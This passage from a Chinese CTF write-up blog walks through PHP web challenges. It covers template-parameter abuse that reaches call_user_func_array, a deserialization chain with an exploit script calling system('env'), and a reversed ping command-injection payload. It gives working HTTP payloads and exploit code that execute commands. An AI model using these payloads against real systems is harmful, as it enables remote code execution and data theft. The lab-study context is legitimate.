                    <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">return</span> <span class="token variable">$rt</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> <span class="token string single-quoted-string">'list'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼发现命令执行的函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么我们的目标就是最后触发<code>$rt = call_user_func_array(&#39;system&#39;, &#39;命令&#39;);</code>，即<code>$param[&#39;name&#39;]=system</code>，<code>$p=命令</code></p>
<p>现在往回推看switch语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$system</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span>  <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$force</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$var</span> <span class="token operator">=></span> <span class="token variable">$t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'param'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$rt</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$rt</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">case</span> <span class="token string single-quoted-string">'list'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们要让<code>$system[&#39;action&#39;]</code>为function，而在&#x2F;template&#x2F;admin&#x2F;路由下这个参数传入的已经写死了是list</p>
<p>然后让<code>$param[&#39;name&#39;]</code>存在且是函数，这个是已经能够满足了的条件</p>
<p>接着是<code>$force</code>即<code>$param[&#39;force&#39;]</code>为false，也就是传入的值要为0或者false</p>
<p>接下来就是重点的<code>foreach</code>语句，首先要求传入的键名中开头必须是param，然后会截取param后面的字符串并用<code>intval</code>取整，把取整后的值作为<code>$p</code>的索引，其值为传入的键值。而要实现<code>$p=命令</code>，我们就需要让<code>$p[0]=命令</code>（下标不一定要为0，只要是正整数即可）；要让<code>$n=0</code>，就需要用到intval函数的特性，<code>intval(&quot;0xxxxx&quot;)==0</code>，所以这里最后要传入<code>param0xxxxx = 命令</code></p>
<p>switch语句的内容就这些，继续向上看前一段if语句，中间的foreach语句我们用不上</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//删除两侧多余的空格</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token variable">$_params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//以空格分隔成数组</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'list'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'action='</span> <span class="token operator">.</span> <span class="token variable">$params</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果<code>$params</code>数组第一个元素是<code>&#39;list&#39;</code> 或者<code>&#39;function&#39;</code>，就把<code>$params</code>数组第一个元素的内容，前面加上一个字符串<code>action=</code></p>
<p>所以我们的<code>$params</code>数组中的元素一般应该为<code>$params=[&quot;function&quot;,&quot;name=system&quot;,&quot;force=false&quot;,&quot;param0xxxxx=命令&quot;]</code>，这里把function放在了第一个元素，当然，我们也可以直接指定<code>$params=[&quot;action=function&quot;,&quot;name=system&quot;,&quot;force=false&quot;,&quot;param0xxxxx=命令&quot;]</code>，这样子这个数组中function的位置就可以是任意的</p>
<p>但是，我们上面已经分析过，&#x2F;template&#x2F;admin&#x2F;路由下action参数已经写死了是list，我们可控的只有<code>$mod</code>，因为传参一定会带有一个前缀，所以我们无法控制<code>$_params</code>字符串分割成的数组<code>$params</code>的第一个元素是<code>&quot;function&quot;</code>，第一个元素只会是<code>action=list</code>。所以，上面的<code>$params</code>数组中的元素只能直接指定为后者<code>$params=[&quot;action=function&quot;,&quot;name=system&quot;,&quot;force=false&quot;,&quot;param0xxxxx=命令&quot;]</code></p>
<p>那么listdata方法的部分就到此为止</p>
<p>要调用listdata方法，我们就需要进入<code>template/admin/</code>这个路由，可以在前面display方法中<code>include($this-&gt;template);</code>包含这个路由，即<code>$this-&gt;template = template/admin/</code></p>
<p>而要改变<code>$this-&gt;template</code>，我们就需要回到<code>getTempName</code>方法，目的是执行<code>$this-&gt;template = str_replace(&#39;..&#39;,&#39;&#39;,&#39;./template/admin/&#39;.$template);</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getTempName</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./template/admin/'</span><span class="token operator">.</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./template/index.html'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么就要让getTempName方法的形参<code>$dir = admin</code>，接着是要求拼接后的结果必须是一个文件，<code>template/admin/</code>只是一个路由，我们需要访问默认的页面文件<code>template/admin/index.html</code>，所以传入getTempName方法的形参<code>$template = index.html</code></p>
<p>但是<code>getTempName($template,$dir)</code>方法的形参来源于<code>display()</code>方法的方法内变量（也可以叫属性）<code>$template</code>和<code>$space</code>。而这两个属性在方法内是不存在的，要使这两个属性存在且有我们需要的值，需要执行<code>extract($this-&gt;date);</code>语句，从数组中将变量导入到当前的符号表即可</p>
<p>注意，此时我们还没有传入<code>$mod</code>参数的值，而<code>listdata()</code>方法是在<code>display()</code>方法中被包含并且调用的，所以<code>$this-&gt;date</code>就应该为<code>[&#39;template&#39;=&gt;&#39;index.html&#39;,&#39;space&#39;=&gt;&#39;admin&#39;,&#39;mod&#39;=&gt;&#39;0w0 action=function name=system force=false param0xxxxx=命令&#39;]</code></p>
<p>那么构造我们的payload：</p>
<p>在最开始的index.php中，get传入参数filename给构造方法，所以我们可以直接传index.html</p>
<p>先读phpinfo，其实flag也在这里，注：此时调用的是<code>call_user_func</code></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET 
?filename=index.html
POST
space=admin&amp;mod=0w0 action=function force=0 name=phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231101172225430.png" alt="image-20231101172225430"></p>
<p>发现禁用了大量命令执行的函数，但是还留了个exec</p>
<p>那么就是无回显rce了，直接写入文件外带，注意命令这里空格要用<code>$&#123;IFS&#125;</code>以防被上面的trim和explode操作删掉</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET 
?filename=index.html
POST
space=admin&amp;mod=0w0 action=function force=0 name=exec param0xxx=ls$&#123;IFS&#125;/>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231101172551754.png" alt="image-20231101172551754"></p>
<hr>
<h1 id="HZNUCTF-2023-preliminary-ppppop"><a href="#HZNUCTF-2023-preliminary-ppppop" class="headerlink" title="[HZNUCTF 2023 preliminary]ppppop"></a>[HZNUCTF 2023 preliminary]ppppop</h1><blockquote>
<p>反序列化</p>
</blockquote>
<p>进入题目，啥都没有，在响应头处发现<code>Set-Cookie：user=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9</code></p>
<p>base64解码得到<code>O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;</code></p>
<p>尝试把其中的0改成1再base64编码回去传cookie，得到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'utils.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$className</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcName</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$args</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">className</span><span class="token punctuation">;</span>
        <span class="token variable">$funcName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcName</span><span class="token punctuation">;</span>
        <span class="token variable">$class</span><span class="token operator">-></span><span class="token variable">$funcName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单的反序列化操作触发<code>__call</code>从而命令执行，然后注意底下传payload要先反转后编码</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$className</span><span class="token operator">=</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcName</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$args</span><span class="token operator">=</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">className</span><span class="token punctuation">;</span>
        <span class="token variable">$funcName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcName</span><span class="token punctuation">;</span>
        <span class="token variable">$class</span><span class="token operator">-></span><span class="token variable">$funcName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag在环境变量里</p>
<hr>
<h1 id="HZNUCTF-2023-preliminary-guessguessguess"><a href="#HZNUCTF-2023-preliminary-guessguessguess" class="headerlink" title="[HZNUCTF 2023 preliminary]guessguessguess"></a>[HZNUCTF 2023 preliminary]guessguessguess</h1><blockquote>
<p>命令执行</p>
</blockquote>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231102002437823.png" alt="image-20231102002437823"></p>
<p>给了一个看似是sql注入的框，下面给出了sql语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试输入hint，发现我们输入的内容会做反转处理</p>
<p>那么输入tnih，回显“可爱的CTFer哟,你掉的是这个金”命令执行”,还是这个银”XSS”还是这个普通的”SQL注入”呢?”</p>
<p>这题最炸裂的地方就是这里不是xss，也不是sql注入，而是命令执行，还是ping的命令注入</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name">sl</span><span class="token operator">|</span><span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.721</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$userArr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username: admin&lt;br>password: admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"username: docker&lt;br>password: docker"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username: mxx307&lt;br>password: mxxxxxxx3333000777"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"username: FLAG_IN_HERE&lt;br>password: 不给你看"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'hint'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$cmd</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your SQL: SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$cmd</span></span>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/127.0.0.1/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/;|&amp;/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping '</span><span class="token operator">.</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"hint"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'可爱的CTFer哟,你掉的是这个金"命令执行",还是这个银"XSS"还是这个普通的"SQL注入"呢?'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\d$/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$userArr</span><span class="token punctuation">[</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no user"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"猜猜猜"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag在环境变量，直接输<code>ofniphp</code>就行了</p>
<hr>
<h1 id="湖湘杯-2021-final-Penetratable"><a href="#湖湘杯-2021-final-Penetratable" class="headerlink" title="[湖湘杯 2021 final]Penetratable"></a>[湖湘杯 2021 final]Penetratable</h1><blockquote>
<p>二次注入+md5强比较+sed提权</p>
</blockquote>
<p>进入题目，有一个登录注册的界面，url带着参数?id，猜测存在sql注入</p>
